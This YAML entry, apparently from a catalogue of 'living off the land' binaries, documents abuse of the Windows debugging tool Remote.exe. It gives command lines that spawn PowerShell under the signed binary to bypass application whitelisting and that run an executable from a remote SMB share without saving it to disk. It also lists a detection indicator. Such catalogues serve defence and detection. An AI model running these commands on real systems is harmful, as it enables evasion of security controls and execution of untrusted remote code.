---
Name: Remote.exe
Description: Debugging tool included with Windows Debugging Tools
Author: mr.d0x
Created: 2021-06-01
Commands:
  - Command: Remote.exe /s "powershell.exe" anythinghere
    Description: Spawns powershell as a child process of remote.exe
    Usecase: Executes a process under a trusted Microsoft signed binary
    Category: AWL Bypass
    Privileges: User
    MitreID: T1127
    OperatingSystem:
  - Command: Remote.exe /s "powershell.exe" anythinghere
    Description: Spawns powershell as a child process of remote.exe
    Usecase: Executes a process under a trusted Microsoft signed binary
    Category: Execute
    Privileges: User
    MitreID: T1127
    OperatingSystem:
  - Command: Remote.exe /s "\\10.10.10.30\binaries\file.exe" anythinghere
    Description: Run a remote file
    Usecase: Executing a remote binary without saving file to disk
    Category: Execute
    Privileges: User
    MitreID: T1127
    OperatingSystem:
Full_Path:
  - Path: C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\remote.exe
  - Path: C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\remote.exe
Code_Sample:
  - Code:
Detection:
  - IOC: remote.exe spawned
Resources:
  - Link: https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/
Acknowledgement:
  - Person: mr.d0x
    Handle: '@mrd0x'
---
